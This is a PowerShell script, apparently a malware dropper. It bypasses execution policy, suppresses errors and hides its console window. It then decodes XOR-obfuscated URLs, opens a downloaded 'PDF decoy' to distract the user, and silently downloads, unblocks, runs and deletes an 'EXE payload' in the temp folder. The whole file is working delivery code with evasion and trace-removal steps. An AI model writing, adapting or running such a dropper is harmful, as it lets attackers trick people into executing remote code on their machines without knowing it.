$ErrorActionPreference   = "SilentlyContinue"
$WarningPreference       = "SilentlyContinue"
$VerbosePreference       = "SilentlyContinue"
$ProgressPreference      = "SilentlyContinue"

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

function Force-FileDelete {
    param(
        [string]$Path
    )

    if ([System.IO.File]::Exists($Path)) {
        try {
            [System.IO.File]::Delete($Path)
        } catch {
            $dir  = [System.IO.Path]::GetDirectoryName($Path)
            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
            $ext  = [System.IO.Path]::GetExtension($Path)

            $counter = 1
            do {
                $newPath = [System.IO.Path]::Combine($dir, "$name($counter)$ext")
                $counter++
            } while ([System.IO.File]::Exists($newPath))

            try {
                [System.IO.File]::Move($Path, $newPath)
            } catch {}
        }
    } else {}
}

function CODE_SEG {
    param(
        [Parameter(Mandatory)][string] $Name,
        [Parameter(Mandatory)][string] $PdfURL,
        [Parameter(Mandatory)][string] $ExeURL
    )

    [Net.ServicePointManager]::SecurityProtocol = `
        [Net.SecurityProtocolType]::Ssl3  -bor `
        [Net.SecurityProtocolType]::Tls   -bor `
        [Net.SecurityProtocolType]::Tls11 -bor `
        [Net.SecurityProtocolType]::Tls12 -bor `
        [Net.SecurityProtocolType]::Tls13

    Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@

    $ConsoleWin = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($ConsoleWin, 0)

    # ---- PDF decoy (always save to %TEMP% so it never fails) ----
    $PdfPath = Join-Path $env:TEMP ($Name + ".pdf")
    Force-FileDelete -Path $PdfPath

    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing
    Start-Process $PdfPath

    # ---- EXE payload (fixed: no -Wait, no -WindowStyle Hidden, forced .exe) ----
    $ExePath = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName() + ".exe")

    Invoke-WebRequest -Uri $ExeURL -OutFile $ExePath -UseBasicParsing
    Unblock-File -Path $ExePath

    # Start detached so the script finishes and the EXE keeps running
    Start-Process -FilePath $ExePath -WorkingDirectory $env:TEMP

    # Give the process time to load before deleting the stub
    Start-Sleep -Seconds 3

    try { [System.IO.File]::Delete($ExePath) } catch {}
}

$ClientName  = $($k9883='(k}iVKRo*!-h';$b=[byte[]](0x61,0x05,0x0b,0x06,0x3f,0x28,0x37);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9883);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$DocumentURL = $($k7154=147;$b=[byte[]](0xfb,0xe7,0xe7,0xe3,0xe0,0xa9,0xbc,0xbc,0xe4,0xe4,0xe4,0xbd,0xe0,0xe0,0xe6,0xf6,0xe7,0xbd,0xf6,0xf7,0xe6,0xbd,0xe3,0xf8,0xbc,0xe4,0xe3,0xbe,0xf0,0xfc,0xfd,0xe7,0xf6,0xfd,0xe7,0xbc,0xe6,0xe3,0xff,0xfc,0xf2,0xf7,0xe0,0xbc,0xc6,0xd4,0xbe,0xc1,0xa1,0xbe,0xc1,0xf6,0xe0,0xe6,0xff,0xe7,0xbe,0xf2,0xfd,0xf7,0xbe,0xdc,0xf5,0xf5,0xf6,0xe1,0xfa,0xfd,0xf4,0xbe,0xdf,0xfa,0xe0,0xe7,0xbe,0xa1,0xa7,0xbe,0xd5,0xf6,0xf1,0xbd,0xe3,0xf7,0xf5);-join($b|%{[char]($_-bxor$k7154)}));
$ExeURL      = $($k1476=30;$b=[byte[]](0x76,0x6a,0x6a,0x6e,0x6d,0x24,0x31,0x31,0x6a,0x76,0x7b,0x30,0x7b,0x7f,0x6c,0x6a,0x76,0x30,0x72,0x77,0x31,0x60,0x6d,0x79,0x6a,0x7f,0x6a,0x76,0x7f,0x73,0x31,0x6e,0x6b,0x6a,0x6a,0x67,0x31,0x72,0x7f,0x6a,0x7b,0x6d,0x6a,0x31,0x69,0x28,0x2a,0x31,0x6e,0x6b,0x6a,0x6a,0x67,0x30,0x7b,0x66,0x7b);-join($b|%{[char]($_-bxor$k1476)}));

CODE_SEG -Name $ClientName -PdfURL $DocumentURL -ExeURL $ExeURL
